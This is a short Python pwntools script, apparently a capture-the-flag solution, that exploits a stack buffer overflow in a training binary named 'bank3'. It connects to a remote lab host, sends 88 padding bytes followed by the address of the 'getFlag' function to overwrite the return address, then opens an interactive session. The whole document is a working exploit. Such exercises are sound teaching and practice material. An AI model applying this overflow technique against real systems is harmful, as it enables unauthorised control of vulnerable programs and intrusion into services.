from pwn import *

con = remote('vm.daotao.antoanso.org', 32781)
elf = ELF('./bank3')

payload = b'A' * 88 + p32(elf.symbols['getFlag'], endianness="little")
con.sendline(payload)

con.interactive()